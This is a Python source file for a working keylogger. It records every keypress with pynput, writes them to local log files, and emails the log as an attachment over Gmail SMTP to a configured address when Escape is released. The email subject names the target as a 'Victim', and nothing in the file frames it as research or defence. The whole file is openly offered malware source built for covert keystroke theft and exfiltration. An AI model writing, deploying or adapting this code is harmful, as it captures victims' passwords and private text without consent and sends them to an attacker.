from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import logging
from dotenv import load_dotenv

load_dotenv();

sender_email = os.getenv("SENDER_EMAIL");
sender_email_password = os.getenv("EMAIL_PASSWORD_GENERATED");
reciver_email = os.getenv("RECIEVER_EMAIL");
mail_server = "smtp.gmail.com";

#mail server
PORT = 587;

log = ""

def send_mail(file_path):
 
    # Create a multipart message
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = reciver_email
    msg['Subject'] = 'Email with Attachment of Keylloger from Victim'
     # Attach the file to the email
    with open(file_path, 'rb') as file:
        file_mime = MIMEBase('application', 'octet-stream')
        file_mime.set_payload(file.read())
    encoders.encode_base64(file_mime)
    file_mime.add_header('Content-Disposition', 'attachment', filename=file_path)
    msg.attach(file_mime)
    # Create an SMTP session
    session = smtplib.SMTP(mail_server, 587)
    # Start the SMTP session
    session.starttls()
    # Log in to the mail server
    session.login(sender_email, sender_email_password)
    # Send the email
    text = msg.as_string()
    session.sendmail(sender_email, reciver_email, text)
    # Close the SMTP session
    session.quit()
    
    

logging.basicConfig(filename='key_log.log', level=logging.DEBUG, format='%(asctime)s: %(message)s')
def clear_log(log_file_path):
    with open(log_file_path, 'w') as f:
        pass
clear_log("key_log.log");

def on_press(key):
    global log
    log = f"{key} pressed\n"
    logging.info(f'Key {key} pressed')
    print(log);
    with open("keylog.txt", "a") as f:
        f.write(log)

def on_release(key):
    global log
    if key == keyboard.Key.esc:
        send_mail("key_log.log");
        return False
    
def write_log():
    with open("keylog.txt", "w") as f:
        # TODO: Add implementation
        pass
    
write_log();

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

    